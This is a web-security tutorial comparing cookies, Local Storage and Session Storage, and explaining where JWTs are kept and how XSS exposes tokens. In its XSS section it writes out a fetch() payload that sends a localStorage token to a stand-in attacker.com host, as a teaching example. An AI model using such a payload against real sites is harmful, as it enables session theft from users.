Local Storage
Local Storage stores data permanently inside the browser.

Unlike cookies:

It is not automatically sent to the server.
It can only be accessed through JavaScript.
Example:

localStorage.setItem("theme","dark");
Reading the value:

localStorage.getItem("theme");
Returns:

dark
Local Storage Characteristics
Stored in browser
Accessible through JavaScript
Not automatically sent to the server
Survives browser restart
Shared across tabs of the same origin
Local Storage Example
Website saves:

Theme = Dark

Language = English
User closes browser.

User opens browser tomorrow.

Settings still exist.

Session Storage
Session Storage works almost exactly like Local Storage.

The main difference:

It only exists while the browser tab remains open.

Example:

sessionStorage.setItem("cart","3 items");
Close the browser tab.

The data disappears.

Session Storage Characteristics
Stored in browser
Accessible through JavaScript
Not automatically sent to server
Exists only for one browser tab
Deleted when the tab closes
Cookie vs Local Storage vs Session Storage
Feature	Cookies	Local Storage	Session Storage
Stored in Browser	✅	✅	✅
Automatically Sent to Server	✅	❌	❌
Accessible through JavaScript	Usually (unless HttpOnly)	✅	✅
Survives Browser Restart	Depends on Expiration	✅	❌
Shared Across Tabs	Usually	✅	❌
Where Are JWTs Stored?
Developers commonly choose one of three locations.

Option 1 — Cookies
Example:

Cookie:

jwt=eyJhbGc...
Advantages:

Automatically sent
Can use HttpOnly
Can use Secure
Can use SameSite
Disadvantages:

Must be protected against CSRF
Option 2 — Local Storage
Example:

localStorage.setItem("token",jwt);
Advantages:

Very easy to use
Popular in React, Angular and Vue applications
Disadvantages:

JavaScript can read it.

If an attacker finds an XSS vulnerability:

localStorage.getItem("token");
The JWT can be stolen.

Option 3 — Session Storage
Similar to Local Storage.

Difference:

The token disappears after the browser tab closes.

Still accessible through JavaScript.

XSS and Browser Storage
Suppose a website has an XSS vulnerability.

Attacker executes:

alert(localStorage.getItem("token"));
The JWT becomes visible.

Even worse:

fetch("https://attacker.com/?token="+localStorage.getItem("token"));
The attacker steals the token.

This is why storing sensitive authentication tokens in Local Storage increases the impact of XSS.

HttpOnly Cookies
Suppose the server sends:

Set-Cookie:

session=abc123;

HttpOnly
Attacker executes:

document.cookie
Result:

HttpOnly Cookie Not Accessible
JavaScript cannot read HttpOnly cookies.

This significantly reduces the risk of cookie theft through XSS.

Important Note About HttpOnly
HttpOnly prevents JavaScript from reading the cookie.

However:

The browser still automatically sends the cookie with requests.

Therefore:

An XSS vulnerability may still perform actions as the logged-in user even though it cannot steal the cookie itself.

HttpOnly protects against cookie theft, not against all consequences of XSS.

